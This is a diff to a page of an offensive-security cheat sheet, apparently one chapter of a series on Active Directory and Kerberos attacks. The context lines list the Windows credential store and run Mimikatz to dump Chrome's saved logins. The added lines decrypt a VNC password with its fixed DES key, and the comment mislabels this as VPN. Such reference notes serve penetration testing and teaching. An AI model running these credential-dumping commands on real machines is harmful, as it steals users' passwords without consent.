@@ -173,6 +173,16 @@ dir C:\Users\$USER\AppData\Local\Microsoft\Credentials\
 .\Mimikatz.exe 'dpapi::chrome /in:%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data /unprotect' exit
 ```
 
+## MICS 
+
+```bash
+# VPN Decrypt 
+# Assume the string from the .vnc file is d7a514d8c556aade
+
+echo -n d7a514d8c556aade | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d -provider legacy -provider default | hexdump -Cv
+
+```
+
 ---
 
 [← Prev: 03 — Kerberos Attacks](03-kerberos-attacks.md) | [Next: 05 — Kerberos Delegation Attacks →](05-kerberos-delegation-attacks.md)
